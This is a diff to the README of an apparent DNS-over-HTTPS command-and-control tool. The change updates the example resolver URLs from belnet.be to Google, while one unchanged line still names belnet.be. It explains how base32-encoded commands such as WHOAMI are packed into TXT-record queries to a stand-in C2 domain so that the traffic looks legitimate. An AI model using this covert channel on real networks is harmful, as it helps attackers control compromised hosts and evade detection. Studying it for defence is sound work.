@@ -6,8 +6,8 @@ thereby making the traffic appear legitimate and harder to detect by traditional
 # Architecture
 ![image](https://github.com/user-attachments/assets/e0e0c705-e5a2-4934-b265-f70e39ca668b)  
 
-The python program on the client side sends HTTPS request (TCP/443) to DoH Server to resolve a destination domain where the c2 is hosted, e.g send.example.com.co using a  the legit DOH server, json query like https[:]//dns.belnet.be/dns-query?name=google.com &type=TXT  
-An attacker can use the part which is between the name and ‘&’ to inject txt record which is not bigger than 512 bytes of size e.g https[:]//dns.belnet.be/dns-query?name=SINGLE-1-K5EE6QKNJEFA====.send.example.com.co&type=TXT  
+The python program on the client side sends HTTPS request (TCP/443) to DoH Server to resolve a destination domain where the c2 is hosted, e.g send.example.com.co using a  the legit DOH server, json query like https[:]//dns.google.com/resolve?name=google.com &type=TXT  
+An attacker can use the part which is between the name and ‘&’ to inject txt record which is not bigger than 512 bytes of size e.g https[:]//dns.google.com/resolve?name=SINGLE-1-K5EE6QKNJEFA====.send.example.com.co&type=TXT  
 'SINGLE-1-K5EE6QKNJEFA===='  => the base32 encoded query (K5EE6QKNJEFA====  is basically WHOAMI )  
 send.example.com.co => the DNS c2 server  
 The belnet.be is instructed to query the send.example.com.co DNS server for the TXT record.  
